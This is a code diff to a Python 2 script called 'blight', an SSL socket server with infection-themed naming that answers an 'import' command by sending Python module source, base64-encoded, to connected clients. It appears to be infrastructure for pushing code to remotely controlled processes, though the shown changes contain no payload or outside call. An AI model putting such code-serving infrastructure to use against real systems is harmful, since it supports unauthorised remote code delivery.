@@ -5,10 +5,14 @@ import select
 import base64
 import socket
 import Queue
+import pkgutil
 import imp
 import sys
 import ssl
 import os
+
+
+from types import ModuleType
 
 def log(inp, quiet=0):
     try:
@@ -21,6 +25,7 @@ def log(inp, quiet=0):
 
 class blight():
     
+
         def __init__(self,laddr,port,strict,keyfile,certfile):
             self.laddr = laddr 
             self.lport = port  
@@ -29,12 +34,13 @@ class blight():
             self.certfile = certfile
             self.open_conns = []
     
+            self.module_code = ""
 
-            self.transmission_mode = None
+            self.transmission_mode = base64.b64encode
 
             self.symptoms = {
                 "import":self.get_package,
-                "set_mode":self.set_transmission_mode
+                "set_mode":self.set_transmission_mode,
             }
 
             self.transmission_server()
@@ -89,6 +95,7 @@ class blight():
                 sys.exit(-1)
 
              try:
+                resp=""
                 while True:
                     __, inbound, __ = select.select([],[comms_sock],[]) 
                     if inbound:
@@ -115,7 +122,7 @@ class blight():
         def inp_handle(self,buf):
             buf = buf.split(' ')     
             cmd = buf[0]
-            args = buf[1:]
+            args = ' '.join(buf[1:])
 
             try:
                 resp = self.symptoms[cmd](args) 
@@ -124,8 +131,9 @@ class blight():
             return resp
 
 
-        
         def out_handle(self,buf):
+            print "[>.>] sending buff len: %d" % len(buf)
+            print buf
             if self.transmission_mode:
                 buf = self.transmission_mode(buf)
             
@@ -145,13 +153,25 @@ class blight():
 
 
         def get_package(self,package):
-            fp,path,desc = imp.find_module(package)
-            if fp:
-                return fp.read()
-            else:
-                print "no file found. Prob dir?"
-                 
+            moddir = os.path.join(os.getcwd(),"mods")
+            mod = "%s.py" % os.path.join(moddir,package)
+            ret = ""
+                
+            try:
+                with open(mod,'r') as f:
+                    ret = f.read()
+                    print ret
+            except:
+                fd,loc,desc = imp.find_module(package)            
+                print "fd:%s,loc:%s,desc:%s" % (fd,loc,desc)
+                ret = os.path.join(loc,package)
+                ret += ".py" 
 
+                with open(ret,'r') as f:
+                    ret = f.read()
+
+            return ret
+                      
 #### END Definitions of Symptoms
 
 
@@ -181,7 +201,7 @@ class blight():
 
 if __name__ == "__main__":
 
-    print "<(X.X)> ~ blight ~ <(x.x)>\r\n"
+    print "<(X.X)>  ~ blight ~  <(x.x)>"
     print " ~ The fun is infectious   ~"
 
     progDesc = ("<(x.x)> ~blight.py~ <(x.x)>\r\n"
